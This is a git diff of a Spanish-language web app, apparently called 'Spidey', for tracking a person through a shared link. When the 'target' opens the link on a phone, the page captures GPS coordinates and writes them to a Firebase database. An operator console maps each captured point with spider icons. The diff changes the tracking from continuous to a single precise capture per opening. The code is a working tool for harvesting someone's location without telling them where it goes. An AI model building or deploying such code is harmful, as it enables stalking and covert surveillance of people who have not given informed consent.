@@ -17,8 +17,8 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
 let map;
-let mainMarker; // Marcador principal del objetivo actual
-const marcadoresAraña = new LayerGroup(); // Grupo para los puntos históricos
+let mainMarker;
+const marcadoresAraña = L.layerGroup(); // Grupo para los puntos históricos
 const ubicacionPorDefecto = [14.3333, -90.6667]; 
 
 // Detectar si la URL trae un parámetro de objetivo
@@ -28,44 +28,78 @@ const targetId = urlParams.get('target');
 document.addEventListener("DOMContentLoaded", function () {
     // Inicializar el mapa
     map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
-    marcadoresAraña.addTo(map); // Añadir el grupo de arañas al mapa
+    marcadoresAraña.addTo(map);
 
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         maxZoom: 19,
         attribution: '&copy; OpenStreetMap contributors'
     }).addTo(map);
 
-    // Marcador principal (inicialmente en posición por defecto)
     mainMarker = L.marker(ubicacionPorDefecto, {
-        zIndexOffset: 1000 // Asegura que esté sobre las arañas
+        zIndexOffset: 1000
     }).addTo(map)
       .bindPopup("<b>Sistema centralizado.</b> Esperando señal...");
 
     setTimeout(() => { map.invalidateSize(); }, 200);
 
-    // ESCENARIO A: Alguien abrió el enlace en su celular
+    // ESCENARIO A: Alguien abrió el enlace en su celular (El "pestañeo" único)
     if (targetId) {
-        document.getElementById('banner-status').innerHTML = "TRANSMITIENDO SEÑAL<br>GPS ACTIVO...";
-        iniciarTransmisionRemota(targetId);
+        document.getElementById('banner-status').innerHTML = "OBTENIENDO SEÑAL<br>GPS ÚNICO...";
+        capturarYEnviarUbicacionUnica(targetId);
     } else {
-        // ESCENARIO B: Estás en tu consola principal; mostramos historial y escuchamos en tiempo real
-        document.getElementById('banner-status').innerHTML = "CONSOLA CENTRAL<br>CARGANDO HISTORIAL...";
+        // ESCENARIO B: Estás en tu consola principal; cargamos todas las arañas del historial
+        document.getElementById('banner-status').innerHTML = "CONSOLA CENTRAL<br>CARGANDO ARAÑAS...";
         cargarPuntosHistoricos("objetivo_principal");
         escucharObjetivoEnTiempoReal("objetivo_principal");
     }
 });
 
-// --- FUNCIONALIDAD DE VISUALIZACIÓN ---
+// --- FUNCIONALIDAD DE CAPTURA ÚNICA (EL PESTAÑEO) ---
+function capturarYEnviarUbicacionUnica(id) {
+    if (!navigator.geolocation) {
+        document.getElementById('banner-status').innerHTML = "ERROR<br>GPS NO SOPORTADO";
+        return;
+    }
 
-// 1. Cargar todos los puntos pasados (Historial)
+    // Obtener la ubicación una sola vez (pestañeo rápido)
+    navigator.geolocation.getCurrentPosition(
+        async (position) => {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const timestamp = new Date();
+
+            try {
+                // 1. Guardar en la subcolección de historial para que aparezca la araña 🕷️
+                const refHistorial = doc(collection(db, "rastreos", id, "lecturas"));
+                await setDoc(refHistorial, { lat, lng, timestamp });
+
+                // 2. Actualizar también el documento principal por si acaso
+                await setDoc(doc(db, "rastreos", id), { lat, lng, timestamp });
+
+                document.getElementById('banner-status').innerHTML = "SEÑAL CAPTURADA<br>TRANSMISIÓN EXITOSA";
+                console.log("Ubicación única enviada:", lat, lng);
+            } catch (e) {
+                console.error("Error al escribir en la base de datos:", e);
+                document.getElementById('banner-status').innerHTML = "ERROR DE RED<br>AL TRANSMITIR";
+            }
+        },
+        (error) => {
+            console.error("Error de GPS:", error);
+            document.getElementById('banner-status').innerHTML = "ACCESO DENEGADO<br>AL GPS";
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+}
+
+// --- VISUALIZACIÓN EN CONSOLA PRINCIPAL ---
+
+// Cargar todos los puntos en forma de araña 🕷️
 async function cargarPuntosHistoricos(id) {
-    marcadoresAraña.clearLayers(); // Limpiar arañas anteriores
+    marcadoresAraña.clearLayers();
 
     try {
-        // Consultar la subcolección 'lecturas' del objetivo, ordenadas por fecha
         const lecturasRef = collection(db, "rastreos", id, "lecturas");
         const q = query(lecturasRef, orderBy("timestamp", "asc"));
-        
         const querySnapshot = await getDocs(q);
         
         let ultimaUbicacion = null;
@@ -76,7 +110,7 @@ async function cargarPuntosHistoricos(id) {
             const lng = data.lng;
             const timestamp = data.timestamp ? data.timestamp.toDate() : new Date();
 
-            // Crear icono personalizado de araña
+            // Crear icono personalizado con el emoji de araña
             const spiderIcon = L.divIcon({
                 html: '🕷️',
                 className: 'spider-marker',
@@ -84,27 +118,27 @@ async function cargarPuntosHistoricos(id) {
                 iconAnchor: [12, 12]
             });
 
-            // Añadir marcador al mapa
+            // Añadir al mapa como marcador de araña
             L.marker([lat, lng], { icon: spiderIcon })
                 .addTo(marcadoresAraña)
-                .bindPopup(`<b>Punto de Acceso</b><br>Hora: ${timestamp.toLocaleTimeString()}`);
+                .bindPopup(`<b>Punto de Acceso (Araña)</b><br>Hora: ${timestamp.toLocaleTimeString()}`);
             
             ultimaUbicacion = [lat, lng];
         });
 
         if (ultimaUbicacion) {
-            map.fitBounds(marcadoresAraña.getBounds().pad(0.1)); // Ajustar el zoom para ver todas las arañas
-            document.getElementById('banner-status').innerHTML = "HISTORIAL CARGADO<br>LISTO PARA OPERAR";
+            map.fitBounds(marcadoresAraña.getBounds().pad(0.1));
+            document.getElementById('banner-status').innerHTML = "RED DE ARAÑAS ACTIVA<br>PUNTOS CARGADOS";
         } else {
-            document.getElementById('banner-status').innerHTML = "SIN DATOS HISTÓRICOS<br>EN ESTE OBJETIVO";
+            document.getElementById('banner-status').innerHTML = "SIN PUNTOS DE ACCESO<br>REGISTRADOS";
         }
 
     } catch (e) {
-        console.error("Error al cargar historial:", e);
+        console.error("Error al cargar historial de arañas:", e);
     }
 }
 
-// 2. Escuchar la ubicación actual en tiempo real (y guardarla en el historial)
+// Escuchar actualizaciones en tiempo real (si se abriera otra vez)
 function escucharObjetivoEnTiempoReal(id) {
     onSnapshot(doc(db, "rastreos", id), (docSnap) => {
         if (docSnap.exists()) {
@@ -112,100 +146,48 @@ function escucharObjetivoEnTiempoReal(id) {
             const lat = data.lat;
             const lng = data.lng;
 
-            // Actualizar marcador principal
-            map.setView([lat, lng], 16);
             mainMarker.setLatLng([lat, lng]);
-            mainMarker.bindPopup(`<b>¡Objetivo Localizado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
-            
-            document.getElementById('banner-status').innerHTML = "OBJETIVO ENLAZADO<br>SEÑAL ESTABLE";
-
-            // NOTA: Como el objetivo principal se actualiza frecuentemente,
-            // para no saturar el mapa, no añadimos un marcador de araña aquí,
-            // ya que el historial se carga al abrir la consola.
-        } else {
-             document.getElementById('banner-status').innerHTML = "OBJETIVO DESCONECTADO<br>ESPERANDO CONEXIÓN";
+            mainMarker.bindPopup(`<b>Último Acceso Detectado</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`);
         }
     });
 }
 
 // --- BOTONES Y UTILIDADES ---
 
-// Botón SHARE LINK: Genera un enlace personalizado
 window.compartirEnlace = function() {
-    const baseUrl = "https://mmommo52.github.io/Spidey/"; // Tu URL base
+    const baseUrl = "https://mmommo52.github.io/Spidey/";
     const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
     
     navigator.clipboard.writeText(enlaceObjetivo).then(() => {
-        alert("¡Enlace táctico de rastreo copiado!\nEnvíalo al celular objetivo.");
+        alert("¡Enlace táctico de rastreo único copiado!\nAl abrirlo, hará un pestañeo de GPS y registrará una araña.");
     }).catch(err => {
         console.error("Error al copiar enlace:", err);
     });
 };
 
-// Transmitir la ubicación del celular hacia Firebase (y guardar en historial)
-function iniciarTransmisionRemota(id) {
-    if (!navigator.geolocation) { alert("Tu dispositivo no soporta geolocalización."); return; }
-
-    navigator.geolocation.watchPosition(
-        async (position) => {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const timestamp = new Date();
-
-            try {
-                // 1. Actualizar documento principal (tiempo real)
-                const refPrincipal = doc(db, "rastreos", id);
-                await setDoc(refPrincipal, { lat, lng, timestamp });
-
-                // 2. Añadir a subcolección 'lecturas' (historial)
-                const refHistorial = doc(collection(db, "rastreos", id, "lecturas"));
-                await setDoc(refHistorial, { lat, lng, timestamp });
-
-                console.log("Coordenadas enviadas (tiempo real + historial):", lat, lng);
-            } catch (e) {
-                console.error("Error al escribir en la base de datos:", e);
-            }
-        },
-        (error) => { alert("Error de GPS: Asegúrate de dar permisos de ubicación."); },
-        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-    );
-}
-
-// Botón MY LOC / obtenerUbicacionActual
 window.obtenerUbicacionActual = function() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((pos) => {
             const lat = pos.coords.latitude;
             const lng = pos.coords.longitude;
-            // Mueve el mapa y centra en tu posición, pero no mueve el marcador principal
             map.setView([lat, lng], 16);
             L.circleMarker([lat, lng], { radius: 10, color: 'blue', fillColor: 'blue', fillOpacity: 0.3 })
                 .addTo(map)
-                .bindPopup("Tu posición actual (Local)");
+                .bindPopup("Tu posición local");
         });
-    } else {
-        alert("Geolocalización no soportada en este navegador.");
     }
 };
 
-// Botón CENTER MY LOC / centrarEnMiUbicacion
 window.centrarEnMiUbicacion = function() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((pos) => {
-            const lat = pos.coords.latitude;
-            const lng = pos.coords.longitude;
-            map.setView([lat, lng], 17); // Zoom más cercano
-        }, (error) => {
-             alert("No se pudo obtener tu ubicación. Asegúrate de permitir el acceso al GPS.");
-        }, { enableHighAccuracy: true });
-    } else {
-        alert("Geolocalización no soportada.");
+            map.setView([pos.coords.latitude, pos.coords.longitude], 17);
+        }, () => { alert("No se pudo obtener tu ubicación."); }, { enableHighAccuracy: true });
     }
 };
 
-// Funciones secundarias de los botones
-window.accionRastrearObjetivo = () => alert("Protocolo de rastreo activo. Esperando conexión del enlace...");
+window.accionRastrearObjetivo = () => alert("Protocolo de rastreo único listo en el enlace compartido.");
 window.cambiarAlerta = (t) => alert("Alerta: " + t);
 window.cambiarPerfil = (n) => alert("Perfil: " + n);
 window.abrirChat = () => alert("Canal de chat seguro abierto.");
-window.verArchivo = () => alert("Abriendo registros históricos...");
+window.verArchivo = () => alert("Abriendo registros históricos de arañas...");
